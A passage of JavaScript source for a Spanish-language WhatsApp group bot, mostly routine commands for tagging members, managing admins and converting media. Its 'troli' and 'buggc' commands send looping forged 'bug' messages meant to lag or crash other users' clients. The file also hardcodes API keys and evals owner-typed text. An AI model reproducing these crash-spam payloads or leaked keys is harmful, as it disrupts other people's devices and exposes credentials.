						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
case 'par':
                if (!isGroup) return reply(mess.only.group)
                reply(mess.wait)
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=dappakntlll`) 
				cowo = await getBuffer(anu.result.male)
				FxBot.sendMessage(from, cowo, image, {quoted: mek})
				cewe = await getBuffer(anu.result.female)
				FxBot.sendMessage(from, cewe, image, {quoted: mek})
				
				break
case 'bneon':
                case 'matrix':
                case 'breakwall':
                case 'dropwater': 
                case 'leavest':
                case 'logobp':
                case 'smoketext':
                txt = args.join(" ")
                reply(mess.wait)                   
                buffer = await getBuffer(`https://api.zeks.xyz/api/${command}?apikey=FELIXCRACKAPI409&text=${txt}`)
                FxBot.sendMessage(from, buffer, image, {quoted: mek, sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}})
                	
                     break
         
                    case 'crosslogo':                
                    case 'flowertext':
                    case 'silktext':                
                    case 'glowtext':
                    case 'skytext':
                    case 'cslogo':
                    case 'lithgtext':
                    case 'text3dbox': 
                    case 'sandw':
                    if (args.length == 0) return reply(`Ejemplo de uso: ${prefix + command} texto\n\nEjemplo: ${prefix + command} Felixcrack`)
                    txt = args.join(" ")
                    reply(mess.wait)
                    anu = await fetchJson(`https://api.zeks.xyz/api/${command}?apikey=FELIXCRACKAPI409&text=${txt}`, {method: 'get'})
                    tod = await getBuffer(anu.result)
                    FxBot.sendMessage(from, tod, image, {quoted: mek, sendEphemeral: true, contextInfo: { forwardingScore: 5008, isForwarded: true}})
                    
                    break
case 'top5':
if (!isGroup) return reply(mess.only.group)
try{

d = []
top1 = body.slice(5)
teks = `️‍Top 5${top1}:\n`
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `️‍❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true, {quoted: mek})
} catch (e) {
console.log(e)
reply('Ocurrió Un Error')
}
break
case 'tagall':
				if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
					var tes = mek.participant
					members_id = []
					teks = '\n'
					for (let mem of groupMembers) {
						teks += `├╼ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(`*▢ Mensaje:* ${body.slice(8)}\n*▢ Grupo:*  ${groupName}\n*▢ Miembros:* ${groupMembers.length} \n*▢ Total De Admins:* ${groupAdmins.length}\n┌───⊷ *MENCIONES* ⊶`+teks+'└─────✪ FX ┃ ᴮᴼᵀ ✪───────* ', members_id, true)
					break
					
case 'linkgc':
				case 'linkgp':
				case 'linkgrupo':
				case 'linkdogrupo':
					if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    linkgc = await FxBot.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink del grupo *${groupName}*`
				    FxBot.sendMessage(from, yeh, text, {quoted: txt1})
			        
					break
case 'listonline':
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
        		let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
			    let online = [...Object.keys(FxBot.chats.get(ido).presences), FxBot.user.jid]
			    FxBot.sendMessage(from, 'Lista de usuarios en línea:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: mek,
  			  contextInfo: { mentionedJid: online }
			    })
			    
				break
case '+adm':					
				case 'promote':
				case 'pm':
				case 'dar':
				if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('¡Tagea a la persona que le quieres dar admin!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `Ahora es un admin del grupo, en que te sirvo mi Rey 🤴🏻:\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						FxBot.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`@${mentioned[0].split('@')[0]} *Ahora Eres Admin Del Grupo🛐`, mentioned, true)
						FxBot.groupMakeAdmin(from, mentioned)
					}
					break	
case 'demote':
           case '-adm':
           case 'quitar':
           case 'dm':
           if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('¡Tagea a la persona que le quieres quitar admin!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `Ya no seras admin💩:\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						FxBot.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`@${mentioned[0].split('@')[0]} Ya no eres admin 🤡👌🏻`, mentioned, true)
						FxBot.groupDemoteAdmin(from, mentioned)
					}
					break

case 'creditos':
 txtt =`Hola ${pushname}\n\nSelecciona si quieres abrir o cerrar el grupo, recuerda que esa función solo es para los admins.\n\nSi no eres adm, no la uses por favor o seras eliminado del grupo...\nDepende del admin, Gracias.`

               gbutsan = [
  {buttonId: 'ABRIR GRUPO', buttonText: {displayText: 'ABRIR GRUPO'}, type: 1},
  {buttonId: 'CERRAR GRUPO', buttonText: {displayText: 'CERRAR GRUPO'}, type: 1},
]

               imageMsg = (await FxBot.prepareMessageMedia(fs.readFileSync(`./stik/thumb.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/thumb.jpeg`)})).imageMessage

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: '© FxBot Team 🍡\nApoyame suscribiendote', imageMessage: imageMsg,
               buttons: gbutsan,
               headerType: 4
}

               prep = await FxBot.prepareMessageFromContent(from,{buttonsMessage},{quoted: txt1})
               FxBot.relayWAMessage(prep)
               break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('¿Y el enlace?')
            ten = args[0]
            var res = await twitterGetUrl(`${ten}`)
            .then(g => {
            ren = `${g.download[2].url}`
            sendMediaURL(from,ren,'𝐹𝑒𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵𝑂𝑇 🍡')
            })
            break
    
            case 'runtime':
          FxBot.sendMessage(from, fs.readFileSync(`./stik/menu.webp`), sticker, {quoted: fimg, "forwardingScore": 9999, "isForwarded": true})
          break
case 'kick':
          FxBot.sendMessage (from, 'El comando de eliminar miembros ah cambiado, en un momento se enviara un sticker...\n\n¿Como usar?\n\nCon el sticker solo etiqueta el mensaje de la persona a eliminar...', MessageType.text, {quoted: txt1, "forwardingScore": 9999, "isForwarded": true})
          FxBot.sendMessage(from, fs.readFileSync(`./stik/kick.webp`), sticker, {quoted: txt1, "forwardingScore": 9999, "isForwarded": true})
          break
	case 'speed':
	case 'ping':
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			fakegroup(pingnya)
			})
			break  
    case 'totag':
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await mek.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await mek.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            FxBot.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await mek.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await mek.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            FxBot.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await mek.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await mek.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            FxBot.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await mek.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await mek.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            FxBot.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          FxBot.sendMessage(from, `Menciona un sticker/imagen/video/audio junto al comando *${prefix}totag*` , MessageType.text, mek)
        }
        break
case 'togif':
if (!isQuotedSticker) return reply('Responde un sticker')
reply(mess.wait)
if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const media = await FxBot.downloadAndSaveMediaMessage(encmedia)
const upload = await uploadimg(media, Date.now() + '.webp')
const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
const buff = await getBuffer(rume.data.result)
FxBot.sendMessage(from, buff, video, { mimetype: Mimetype.gif, caption: 'Nih', quoted: freply})
}
break
				case 'toimg':
					
			if (!isQuotedSticker) return reply('¡Responde a un sticker')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await FxBot.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Bueno, falló, inténtalo de nuevo ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'𝐹𝑒𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵𝑂𝑇 🍡')
			fs.unlinkSync(ran)
			})
			break 
    case 'tomp4':
case 'tovid':
    case 'tovideo':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await FxBot.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'𝐹𝑒𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵??𝑇 🍡')
            })
            }else {
            reply('Responde a un stiker')
            }
            fs.unlinkSync(owgi)
            break
case 'grupo':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
        
        txtt =`Hola ${pushname}\n\nSelecciona si quieres abrir o cerrar el grupo, recuerda que esa función solo es para los admins.\n\nSi no eres adm, no la uses por favor o seras eliminado del grupo...\nDepende del admin, Gracias.`

               gbutsan = [
  {buttonId: 'ABRIR GRUPO', buttonText: {displayText: 'ABRIR GRUPO'}, type: 1},
  {buttonId: 'CERRAR GRUPO', buttonText: {displayText: 'CERRAR GRUPO'}, type: 1},
]

               imageMsg = (await FxBot.prepareMessageMedia(fs.readFileSync(`./stik/thumb.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/thumb.jpeg`)})).imageMessage

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: '© FxBot Team 🍡\nApoyame suscribiendote', imageMessage: imageMsg,
               buttons: gbutsan,
               headerType: 4
}

               prep = await FxBot.prepareMessageFromContent(from,{buttonsMessage},{quoted: txt1})
               FxBot.relayWAMessage(prep)
               FxBot.sendMessage (from, 'Si no te aparecen los botones...\n\nPrueba con los comandos :\n\n#opengc = Para abrir el grupo.\n\n#closegc = Para cerrar el grupo. ', MessageType.text, {quoted: txt1, "forwardingScore": 9999, "isForwarded": true})
               FxBot.sendMessage (from, 'Un TIP por si no te aparecen los botones.\n\nSi usas WhatsApp MOD, ve a la pestaña de Mods, Despues a Pantalla De Conversación, finalmente en la sección donde dice Fotos, y en la sección que dice Grupo De Chat, desactivamos el que dice Foto Del Participante ( Si es que esta activada )', MessageType.text, {quoted: txt1, "forwardingScore": 9999, "isForwarded": true})
               break
case 'closegc':
case 'closegp':
FxBot.updatePresence(from, Presence.composing)
if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
var nomor = mek.participant
const close = {
text: `Grupo cerrado por : @${nomor.split("@s.whatsapp.net")[0]}`,
contextInfo: {
mentionedJid: [nomor]
}
}
FxBot.groupSettingChange (from, GroupSettingChange.messageSend, true)
reply(close)
break
case 'opengc':
case 'opengp':
FxBot.updatePresence(from, Presence.composing)
if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
var nomor = mek.participant
const open = {
text: `Grupo abierto por : @${nomor.split("@s.whatsapp.net")[0]}`,
contextInfo: {
mentionedJid: [nomor]
}
}
FxBot.groupSettingChange (from, GroupSettingChange.messageSend, false)
reply(open)
break
    case 'troli':
                if (!mek.key.fromMe) return 
                for (let i = 0; i < args[0]; i++) {
                FxBot.sendMessage(from, `Punten !!!`, MessageType.extendedText,{ 
                 quoted: {
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1
                ,surface: 10,
                orderTitle: 'Bug Troly By MR. KR3M',
                sellerJid: '0@s.whatsapp.net'
                }}}}, 0)}
                break
   case 'buggc' :
                if (!mek.key.fromMe) return 
                for (let i = 0; i < args[0]; i++) {
                await FxBot.toggleDisappearingMessages(from, 0)
                reply(`Buf hecho con éxito`)
                }
                break

    case 'tourl':
            case 'imgtourl':
            reply(mess.wait)
            var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            var jnckk = await  FxBot.downloadAndSaveMediaMessage(encmedia)
            var imgbb = require('imgbb-uploader')
            imgbb('3b8594f4cb11895f4084291bc655e510', jnckk)
            .then(data => {
            var caps = `
╭─「 IMGBB TO URL 」
│
├• ID : ${data.id}
├• MimeType : ${data.image.mime}
├• Extension : ${data.image.extension}
│
├• URL : ${data.display_url}
╰─────────────────────`
            ibb = fs.readFileSync(jnckk)
            FxBot.sendMessage(from, ibb, image, { quoted: mek, caption: caps })
            })
            .catch(err => {
            throw err 
            })
            break
    case 'inspeccionar':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('Ingresa el enlace del grupo a inspeccionar')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('Asegúrate de el enlace sea correcto')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await FxBot.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*ID* : ${id}
${owner ? `*Creador del grupo* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nombre del grupo* : ${subject}
*Fecha de creación* : ${formatDate(creation * 1000)}
*Miembros* : ${size}
${desc ? `*Descripción* : ${desc}` : '*Desc* : tidak ada'}
*ID De la descripción* : ${descId}
${descOwner ? `*Última modificación de la descripción* : @${descOwner.split('@')[0]}` : '*Descripción modificada por* : -'}\n*Fecha* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n`
           for ( let y of participants) {
            par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Si' : 'No'}\n`
            jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
            }
            jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
            jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
            FxBot.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
            } catch {
            reply('El link esta incorrecto.')
            }
            break
default:
if (button == 'CREADOR') {
console.log('CREADOR')
let inilist = []
for (let i of ownerNumber) {
const vname = FxBot.contacts[i] != undefined ? FxBot.contacts[i].vname || FxBot.contacts[i].notify : undefined
inilist.push({
"displayName": '© FxBot Team',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${FxBot.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel: Creador\nEND:VCARD`
})
}
hehe = await FxBot.sendMessage(from, {
"displayName": `${inilist.length} kontak`,
"contacts": inilist 
}, 'contactsArrayMessage', { quoted: mek })
FxBot.sendMessage(from,'Este es mi creador, no hagas spam...',text,{quoted: hehe})
}
if (button == 'YOUTUBE') {
console.log('YOUTUBE')
tuh = fs.readFileSync(`./src/canal.jpg`)
teks = `Felixcrack 409\nLink: https://youtube.com/channel/UCqCaZ_SEhSykF3-PR5os7YA\n SUSCRÍBETE ES GRATIS!! ❤️`
FxBot.sendMessage(from, tuh, image, { quoted: mek, caption: teks, contextInfo: { forwardingScore: 1000, isForwarded: true }}) 
}
if (button == 'ABRIR GRUPO') {
console.log('ABRIR EL GRUPO')
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
FxBot.groupSettingChange (from, GroupSettingChange.messageSend, false)
}
if (button == 'CERRAR GRUPO') {
console.log('CERRAR GRUPO')
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
FxBot.groupSettingChange (from, GroupSettingChange.messageSend, true)
}
if (!mek.key.fromMe) return 
if (budy.startsWith('x')){
try {
return FxBot.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'red'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
